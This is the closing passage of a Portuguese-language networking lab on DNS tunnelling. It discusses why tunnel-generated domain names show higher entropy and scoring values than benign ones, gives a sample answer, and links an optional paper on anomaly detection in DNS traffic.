Perceba que em algumas linhas há a presença de bits em codificação hexadecimal como `\xd3`, o que pode ser resultado da codifição de caracteres especiais como `$`.

> [!IMPORTANT]
> Quais diferenças você percebe nos valores de entropia e pontuação para os domínios benignos e para os domínios gerados aleatoriamente no contexto do túnel DNS? Quais as possíveis justificativas para tais difentes?
<textarea name="resposta_dump_manual" rows="6" cols="80" placeholder="Escreva sua resposta aqui..."> </textarea>

É possível observar que os valores de entropia são maiores entre os nomes de domínio relativos ao túnel, o que tem relação com fato de estes nomes serem gerados aleatoriamente, incluindo caracteres especiais, cuja codificação é prejudica, como podemos observar anteriormente. Ainda assim, o valor de pontuação para os domínios gerados aleatoriamente acabam sendo maiores, o que pode ser justificado pelo comprimento dos mesmos ou por conta da presença de bigramas com altos valores de frequência, como os contidos em `.com`.

A criação deste laboratório culminou na escrita do artigo "Avaliação de estratégias para o aperfeiçoamento da detecção de anomalias no tráfego DNS", o qual recebeu a premiação de melhor artigo no VIII WTG do SBRC 2025 e pode ser acessado [aqui](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/docs/artigo_tunelamento_dns.pdf), sendo a leitura opcional.

Com isso, finalizamos as atividades deste laboratório, no qual foi possível aprender sobre o processo de criação de túneis DNS e analisar as informações relativas a ele.
